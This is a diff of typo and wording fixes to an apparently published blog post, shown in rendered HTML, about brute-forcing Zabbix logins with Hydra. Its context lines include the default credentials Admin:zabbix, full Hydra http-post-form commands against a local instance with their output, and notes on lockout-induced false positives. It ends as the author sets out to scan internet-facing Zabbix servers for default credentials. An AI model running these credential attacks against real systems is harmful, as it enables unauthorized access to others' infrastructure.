@@ -39,7 +39,7 @@
   <meta itemprop="name" content="Taking over Zabbix with Hydra">
 <meta itemprop="description" content="The post describes a procedure of breaking into zabbix machines with Hydra. The technique uses brute force and not very effective, however can be utilized for weakly maintianed infrastrcuture."><meta itemprop="datePublished" content="2024-05-22T01:58:40+00:00" />
 <meta itemprop="dateModified" content="2024-05-22T01:58:40+00:00" />
-<meta itemprop="wordCount" content="1116">
+<meta itemprop="wordCount" content="1117">
 <meta itemprop="keywords" content="zabbix,hydra,nuclei,bruteforce," />
 
   
@@ -185,7 +185,7 @@
         <line x1="12" y1="6" x2="12" y2="19" />
         <line x1="21" y1="6" x2="21" y2="19" />
       </svg>
-      1116&nbsp;words
+      1117&nbsp;words
       
         
       
@@ -230,7 +230,7 @@
 <p><img src="/article/taking-over-zabbix-with-hydra/ui.png" alt="ui"></p>
 <p>Let&rsquo;s login with default credentials, <code>Admin:zabbix</code>:</p>
 <p><img src="/article/taking-over-zabbix-with-hydra/insidezabbix.png" alt="ui"></p>
-<p>Now, time to test <code>hudra</code>:</p>
+<p>Now, time to test <code>hydra</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l Admin -p zabbix 127.0.0.1 http-post-form <span style="color:#f1fa8c">&#34;/index.php:name=^USER^&amp;password=^PASS^&amp;autologin=1&amp;enter=Sign+in:Login name or password is incorrect&#34;</span> -V
 </span></span></code></pre></div><p>with the following results:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Hydra v9.0 <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2019</span> by van Hauser/THC - Please <span style="color:#ff79c6">do</span> not use in military or secret service organizations, or <span style="color:#ff79c6">for</span> illegal purposes.
@@ -242,7 +242,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>80<span style="color:#ff79c6">][</span>http-post-form<span style="color:#ff79c6">]</span> host: 127.0.0.1   login: Admin   password: zabbix
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span> of <span style="color:#bd93f9">1</span> target successfully completed, <span style="color:#bd93f9">1</span> valid password found
 </span></span><span style="display:flex;"><span>Hydra <span style="color:#ff79c6">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#ff79c6">)</span> finished at 2024-05-23 13:21:44
-</span></span></code></pre></div><p>What if used invalid password, e.g. <code>zabbix1</code>?</p>
+</span></span></code></pre></div><p>What if we used an invalid password, e.g. <code>zabbix1</code>?</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l Admin -p zabbix1 127.0.0.1 http-post-form <span style="color:#f1fa8c">&#34;/index.php:name=^USER^&amp;password=^PASS^&amp;autologin=1&amp;enter=Sign+in:Login name or password is incorrect&#34;</span> -V
 </span></span></code></pre></div><p>prints</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Hydra v9.0 <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2019</span> by van Hauser/THC - Please <span style="color:#ff79c6">do</span> not use in military or secret service organizations, or <span style="color:#ff79c6">for</span> illegal purposes.
@@ -301,9 +301,9 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>80<span style="color:#ff79c6">][</span>http-post-form<span style="color:#ff79c6">]</span> host: 127.0.0.1   login: Admin   password: jennifer
 </span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span> of <span style="color:#bd93f9">1</span> target successfully completed, <span style="color:#bd93f9">16</span> valid passwords found
 </span></span><span style="display:flex;"><span>Hydra <span style="color:#ff79c6">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#ff79c6">)</span> finished at 2024-05-23 13:36:41
-</span></span></code></pre></div><p>We got many matching passwords from Hydra, e.g. <code>123456</code>, <code>michael</code>, etc. Probably Zabbix hide something regarding their default password. Let&rsquo;s go to the UI and check <code>Admin:123456</code>:</p>
+</span></span></code></pre></div><p>We got many matching passwords, e.g. <code>123456</code>, <code>michael</code>, etc. Probably Zabbix hide something regarding their default password. Let&rsquo;s go to the UI and check <code>Admin:123456</code>:</p>
 <p><img src="/article/taking-over-zabbix-with-hydra/blocked.png" alt="Account is blocked"></p>
-<p>Ok, now it&rsquo;s clear. Zabbix blocked <code>Admin</code> after 19 insuccessful attempts and <code>hydra</code> did not uderstand its answer correctly because it did not find in the response <code>Login name or password is incorrect</code>: all <code>Account is blocked for 30 seconds</code> were interpreted as success.</p>
+<p>Oops&hellip; Ok, now it&rsquo;s clear. Zabbix blocked <code>Admin</code> after 19 insuccessful attempts and <code>hydra</code> did not uderstand its answer correctly because it did not find in the response <code>Login name or password is incorrect</code>: all <code>Account is blocked for 30 seconds</code> were interpreted as success.</p>
 <p>Well, we have discovered Zabbix has an anti-bruteforce policy implemented and that makes our life hard. Therefore, we turn to a very simple and basic case of scanning of wild life zabbixes: we&rsquo;ll try only default zabbix creds in hope the admin forgot to change them. We should also remember that <code>hydra</code> will report false positives for any errors which differ from <code>Login name or password is incorrect</code>.</p>
 <h2 id="wild-life">Wild life</h2>
 <p>We want to identify zabbix services by domain names. Let&rsquo;s first get domains from <a href="https://kaeferjaeger.gay/?dir=sni-ip-ranges" target="_blank" rel="noopener">Kaeferjaegger.gay</a>
